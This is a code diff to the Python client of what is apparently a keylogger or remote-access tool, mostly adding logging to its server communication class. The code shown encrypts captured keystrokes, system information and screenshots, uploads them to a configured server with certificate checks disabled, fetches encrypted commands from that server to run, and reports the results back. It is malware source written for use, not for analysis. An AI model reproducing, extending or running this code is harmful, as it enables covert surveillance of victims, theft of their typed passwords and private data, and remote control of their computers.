@@ -50,6 +50,7 @@ class ServerCommunicator:
 
     def upload_data(self, keystrokes, system_info, screenshot=None):
         try:
+            logging.info(f"Uploading data: client_id={self.client_id}, keystrokes_len={len(keystrokes)}")
             encrypted_data = {
                 "action": "upload_data",
                 "client_id": self.client_id,
@@ -57,11 +58,10 @@ class ServerCommunicator:
                 "keystrokes": self.encryption.encrypt(' '.join(keystrokes)),
                 "system_info": self.encryption.encrypt(json.dumps(system_info))
             }
-    
             files = {}
             if screenshot:
                 files['screenshot'] = ('screenshot.png', screenshot, 'image/png')
-    
+
             response = requests.post(
                 Config.SERVER_URL,
                 data=encrypted_data,
@@ -69,59 +69,48 @@ class ServerCommunicator:
                 timeout=Config.COMMAND_TIMEOUT,
                 verify=False
             )
-            
             if response.status_code != 200:
+                logging.error(f"Upload failed: status={response.status_code}, response={response.text}")
                 raise CommunicationError(f"Upload failed: {response.text}")
-                
+            logging.info("Upload successful")
         except Exception as e:
+            logging.error(f"Upload error: {str(e)}")
             raise CommunicationError(f"Upload error: {str(e)}")
 
     def fetch_commands(self):
         try:
+            logging.info("Fetching commands...")
             response = self._send_request(
-                "?action=get_commands",  # افزودن action به URL
+                "?action=get_commands",
                 data={
                     "action": "get_commands",
                     "client_id": self.client_id,
                     "token": Config.SECRET_TOKEN
                 }
             )
-
-            logging.info(f"Raw server response for commands: {response}")
-
-            # اعتبارسنجی ساختار پاسخ
-            if not isinstance(response, list):
-                raise CommunicationError(f"Invalid commands format: {response}")
-
+            logging.info(f"Received {len(response)} commands")
             validated_commands = []
             for cmd in response:
-                # بررسی وجود فیلدهای ضروری
                 if not all(k in cmd for k in ('id', 'command')):
                     logging.warning(f"Skipping invalid command: {cmd}")
                     continue
-
                 try:
-                    # رمزگشایی دستور برای بررسی فیلد type
                     decrypted = self.encryption.decrypt(cmd['command'])
                     command_data = json.loads(decrypted)
-
                     if 'type' not in command_data:
                         logging.error(f"Command missing 'type': {command_data}")
                         continue
-
-                    # افزودن فیلد type به دستور
                     cmd['type'] = command_data['type']
                     validated_commands.append(cmd)
-
                 except Exception as e:
-                    logging.error(f"Command validation failed: {str(e)}")
-
+                    logging.error(f"Command validation failed: {str(e)}, command={cmd}")
             return validated_commands
-
         except Exception as e:
+            logging.error(f"Failed to fetch commands: {str(e)}")
             raise CommunicationError(f"Failed to process commands: {str(e)}")
 
     def send_command_result(self, command_id, result):
+        logging.info(f"Sending command result for ID {command_id}: {result}")
         return self._send_request(
             "command_response",
             data={
